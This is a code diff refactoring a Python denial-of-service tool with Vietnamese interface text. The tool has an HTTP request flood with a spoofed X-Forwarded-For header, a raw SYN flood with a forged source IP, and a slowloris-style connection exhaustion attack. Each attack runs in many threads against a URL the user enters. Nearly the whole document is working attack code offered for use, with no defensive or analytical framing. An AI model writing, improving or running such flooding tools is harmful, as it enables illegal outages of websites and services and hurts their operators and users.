@@ -5,7 +5,7 @@ import requests
 from urllib.parse import urlparse
 from colorama import Fore, Style
 from socket import *
-from struct import pack
+from struct import pack, htons
 from random import randrange, choice
 import re
 
@@ -25,9 +25,15 @@ def is_valid_ip(ip):
         return all(0 <= int(part) <= 255 for part in ip.split('.'))
     return False
 
-def ddos_requester(target_host, target_port, target_path, fake_ip, attack_num):
+def resolve_domain(domain):
+    try:
+        return gethostbyname(domain)
+    except gaierror:
+        print(f"Không thể phân giải tên miền: {domain}")
+        return None
+
+def ddos_requester(target_url, fake_ip, attack_num):
     headers = {
-        'Host': target_host,
         'X-Forwarded-For': fake_ip,
         'User-Agent': choice(add_useragent()),
         'Cache-Control': 'no-cache',
@@ -36,7 +42,7 @@ def ddos_requester(target_host, target_port, target_path, fake_ip, attack_num):
     }
     while True:
         try:
-            response = requests.get(f"http://{target_host}:{target_port}{target_path}", headers=headers)
+            response = requests.get(target_url, headers=headers)
             attack_num += 1
             print(f"Gói tin đã gửi! Số lần tấn công: {attack_num} - Mã phản hồi: {response.status_code}")
         except requests.RequestException as e:
@@ -51,15 +57,13 @@ def add_useragent():
         "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
     ]
 
-def syn_flood(tgt, port, fake_ip):
-    if not is_valid_ip(fake_ip):
-        print(f"IP giả không hợp lệ: {fake_ip}")
-        return
-    if not is_valid_ip(tgt):
-        print(f"Địa chỉ IP mục tiêu không hợp lệ: {tgt}")
-        return
-
+def syn_flood(target_url, fake_ip):
     try:
+        tgt = urlparse(target_url).netloc
+        if not is_valid_ip(fake_ip):
+            print(f"IP giả không hợp lệ: {fake_ip}")
+            return
+
         while True:
             ihl = 5
             version = 4
@@ -76,7 +80,7 @@ def syn_flood(tgt, port, fake_ip):
             ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
 
             source = 54321
-            dest = port
+            dest = 80  # Cổng mặc định
             seq = 0
             ack_seq = 0
             doff = 5
@@ -103,13 +107,14 @@ def syn_flood(tgt, port, fake_ip):
     except Exception as e:
         print(f"Lỗi trong SYN Flood: {e}")
 
-def pyslow(tgt, port, threads, sleep):
+def pyslow(target_url, threads, sleep):
     try:
+        tgt = urlparse(target_url).netloc
         while True:
             for _ in range(threads):
                 sock = socket(AF_INET, SOCK_STREAM)
-                sock.connect((tgt, port))
-                sock.sendto(b'GET / HTTP/1.1\r\n', (tgt, port))
+                sock.connect((tgt, 80))  # Cổng mặc định
+                sock.sendto(b'GET / HTTP/1.1\r\n', (tgt, 80))
                 time.sleep(sleep)
     except KeyboardInterrupt:
         print("Đã dừng Pyslow.")
@@ -161,24 +166,14 @@ def ddos_with_spoofing(attack_type):
         target_url = input(Fore.RED + Style.BRIGHT + "NHẬP URL CỦA MỤC TIÊU: ")
         parsed_url = urlparse(target_url)
         if parsed_url.scheme and parsed_url.netloc:
-            target_host = parsed_url.netloc
-            target_path = parsed_url.path if parsed_url.path else "/"
+            target_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path if parsed_url.path else '/'}"
             break
         else:
             print("URL không hợp lệ. Vui lòng thử lại.")
 
     fake_ip = input("NHẬP IP GIẢ: ") or fake_ip()
 
-    while True:
-        try:
-            target_port = int(input("NHẬP CỔNG CỦA MỤC TIÊU (cổng mặc định: 80): ") or 80)
-        except ValueError:
-            print("Vui lòng nhập một cổng hợp lệ, hãy thử lại.")
-            continue
-        else:
-            break
-
-    print(f"Đang thực hiện {attack_type} với IP giả {fake_ip} trên {target_url} (Cổng: {target_port})")
+    print(f"Đang thực hiện {attack_type} với IP giả {fake_ip} trên {target_url}")
     print(Fore.YELLOW + Style.BRIGHT + "[THÔNG TIN!]" + Fore.WHITE + " Nếu thông tin trên không chính xác, bạn có thể khởi động lại script và nhập lại chi tiết đúng!!")
 
     time.sleep(4)
@@ -193,15 +188,15 @@ def ddos_with_spoofing(attack_type):
     attack_num = 0
 
     if attack_type == 'requester':
-        for _ in range(threads):
-            thread = threading.Thread(target=ddos_requester, args=(target_host, target_port, target_path, fake_ip, attack_num))
+        for i in range(threads):
+            thread = threading.Thread(target=ddos_requester, args=(target_url, fake_ip, attack_num))
             thread.start()
     elif attack_type == 'synflood':
-        for _ in range(threads):
-            thread = threading.Thread(target=syn_flood, args=(target_host, target_port, fake_ip))
+        for i in range(threads):
+            thread = threading.Thread(target=syn_flood, args=(target_url, fake_ip))
             thread.start()
     elif attack_type == 'pyslow':
-        pyslow(target_host, target_port, threads, 5)
+        pyslow(target_url, threads, 5)
 
 if __name__ == "__main__":
     menu()
